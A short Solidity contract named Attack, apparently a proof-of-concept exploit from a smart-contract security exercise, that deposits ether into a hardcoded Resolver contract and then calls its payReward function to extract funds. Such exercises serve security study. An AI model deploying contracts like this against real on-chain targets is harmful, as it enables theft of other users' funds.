// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./Resolver.sol";

contract Attack {
    address resolver = 0xdDb68Efa4Fdc889cca414C0a7AcAd3C5Cc08A8C5;
    Resolver c = Resolver(resolver);

    function deposit() public payable {
        c.deposit{value: msg.value}(Resolver.Side.A);
    }

    function attack() public {
        c.payReward();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
